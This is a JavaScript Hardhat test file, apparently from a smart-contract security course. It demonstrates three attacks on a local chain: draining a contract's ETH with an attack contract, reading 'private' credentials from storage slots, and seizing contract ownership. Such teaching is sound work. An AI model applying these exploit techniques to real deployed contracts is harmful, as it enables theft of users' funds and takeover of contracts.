const { expect } = require('chai')
const { BigNumber } = require('ethers')
const { parseEther } = require('ethers/lib/utils')
const { ethers } = require('hardhat')

describe('Attack', function () {
  it('Should empty the balance of the good contract', async function () {
    // Deploy the good contract
    const goodContractFactory = await ethers.getContractFactory('GoodContract')
    const goodContract = await goodContractFactory.deploy()
    await goodContract.deployed()

    //Deploy the bad contract
    const badContractFactory = await ethers.getContractFactory('BadContract')
    const badContract = await badContractFactory.deploy(goodContract.address)
    await badContract.deployed()

    // Get two addresses, treat one as innocent user and one as attacker
    const [_, innocentAddress, attackerAddress] = await ethers.getSigners()

    // Innocent User deposits 10 ETH into GoodContract
    let tx = await goodContract.connect(innocentAddress).addBalance({
      value: parseEther('10'),
    })
    await tx.wait()

    // Check that at this point the GoodContract's balance is 10 ETH
    let balanceETH = await ethers.provider.getBalance(goodContract.address)
    expect(balanceETH).to.equal(parseEther('10'))

    // Attacker calls the `attack` function on BadContract
    // and sends 1 ETH
    tx = await badContract.connect(attackerAddress).attack({
      value: parseEther('1'),
    })
    await tx.wait()

    // Balance of the GoodContract's address is now zero
    balanceETH = await ethers.provider.getBalance(goodContract.address)
    expect(balanceETH).to.equal(BigNumber.from('0'))

    // Balance of BadContract is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
    balanceETH = await ethers.provider.getBalance(badContract.address)
    expect(balanceETH).to.equal(parseEther('11'))
  })
  it('Should be able to read the private variables password and username', async function () {
    // Deploy the login contract
    const loginFactory = await ethers.getContractFactory('Login')

    // To save space, we would convert the string to bytes32 array
    const usernameBytes = ethers.utils.formatBytes32String('test')
    const passwordBytes = ethers.utils.formatBytes32String('password')

    const loginContract = await loginFactory.deploy(
      usernameBytes,
      passwordBytes
    )
    await loginContract.deployed()

    // Get the storage at storage slot 0,1
    const slot0Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      0
    )
    const slot1Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      1
    )

    // We are able to extract the values of the private variables
    expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal('test')
    expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal('password')
  })
  it('Should change the owner of the Good contract', async function () {
    // Deploy the helper contract
    const helperContract = await ethers.getContractFactory('Helper')
    const _helperContract = await helperContract.deploy()
    await _helperContract.deployed()
    console.log("Helper Contract's Address:", _helperContract.address)

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory('Good')
    const _goodContract = await goodContract.deploy(_helperContract.address)
    await _goodContract.deployed()
    console.log("Good Contract's Address:", _goodContract.address)

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory('Attack')
    const _attackContract = await attackContract.deploy(_goodContract.address)
    await _attackContract.deployed()
    console.log("Attack Contract's Address", _attackContract.address)

    // Now lets attack the good contract

    // Start the attack
    let tx = await _attackContract.attack()
    await tx.wait()

    expect(await _goodContract.owner()).to.equal(_attackContract.address)
  })
})
